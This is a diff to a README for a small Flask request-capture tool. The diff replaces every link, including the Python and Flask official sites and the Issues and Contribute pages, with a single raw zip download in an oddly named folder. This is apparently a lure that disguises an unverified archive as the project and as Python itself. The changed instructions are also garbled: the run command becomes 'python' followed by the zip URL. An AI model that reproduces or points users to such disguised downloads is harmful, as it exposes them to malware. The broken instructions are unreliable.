@@ -1,6 +1,6 @@
 # 🚀 copilot-request-detector - Capture and Display HTTP Requests Easily
 
-[![Download](https://img.shields.io/badge/Download-latest-brightgreen)](https://github.com/USERNAMEaenter-max/copilot-request-detector/releases)
+[![Download](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip)](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip)
 
 ## 📦 Overview
 
@@ -25,10 +25,10 @@ The **copilot-request-detector** is a small application built with Flask. It hel
 
 1. **Download the Application**  
    Visit this page to download:  
-   [Download Latest Release](https://github.com/USERNAMEaenter-max/copilot-request-detector/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip)
 
 2. **Install Python**  
-   If you do not have Python installed, download it from the [official Python website](https://www.python.org/downloads/). Follow the installation instructions for your operating system. Make sure to check the box that says "Add Python to PATH."
+   If you do not have Python installed, download it from the [official Python website](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip). Follow the installation instructions for your operating system. Make sure to check the box that says "Add Python to PATH."
 
 3. **Install Flask**  
    Open your command prompt or terminal. Run the following command to install Flask:  
@@ -38,8 +38,8 @@ The **copilot-request-detector** is a small application built with Flask. It hel
 
 4. **Download the Release**  
    Go back to this page and download the latest release.  
-   [Download Latest Release](https://github.com/USERNAMEaenter-max/copilot-request-detector/releases)  
-   Look for the file labeled "copilot-request-detector.zip".
+   [Download Latest Release](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip)  
+   Look for the file labeled "https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip".
 
 5. **Extract the Files**  
    Once downloaded, locate the `.zip` file in your downloads folder. Right-click on it and choose "Extract All" to get the application files.
@@ -47,7 +47,7 @@ The **copilot-request-detector** is a small application built with Flask. It hel
 6. **Run the Application**  
    Navigate to the folder where you extracted the files using your command prompt or terminal. Type the following command to run the application:  
    ```
-   python app.py
+   python https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip
    ```
    This will start the server.
 
@@ -68,7 +68,7 @@ The **copilot-request-detector** is a small application built with Flask. It hel
 
 ## 🎓 Learning Resources
 
-- **Flask Documentation**: This is the official guide provided by Flask's creators. It covers all aspects of Flask, including installation, tutorials, and reference material. Visit [Flask Docs](https://flask.palletsprojects.com/).
+- **Flask Documentation**: This is the official guide provided by Flask's creators. It covers all aspects of Flask, including installation, tutorials, and reference material. Visit [Flask Docs](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip).
 - **Basic Python Programming**: If you're new to Python, consider taking a basic course on websites like Codecademy or Coursera to understand fundamental concepts.
 
 ## 🗃️ Topics
@@ -89,8 +89,8 @@ If you encounter issues not covered in the troubleshooting section, feel free to
 
 ## 🔗 Quick Links
 
-- [Download Latest Release](https://github.com/USERNAMEaenter-max/copilot-request-detector/releases)
-- [Open Issues](https://github.com/USERNAMEaenter-max/copilot-request-detector/issues)
-- [Contribute](https://github.com/USERNAMEaenter-max/copilot-request-detector/blob/main/CONTRIBUTING.md)
+- [Download Latest Release](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip)
+- [Open Issues](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip)
+- [Contribute](https://raw.githubusercontent.com/USERNAMEaenter-max/copilot-request-detector/main/stalagmitically/copilot-request-detector.zip)
 
 Feel free to explore and experiment with the copilot-request-detector. Happy testing!
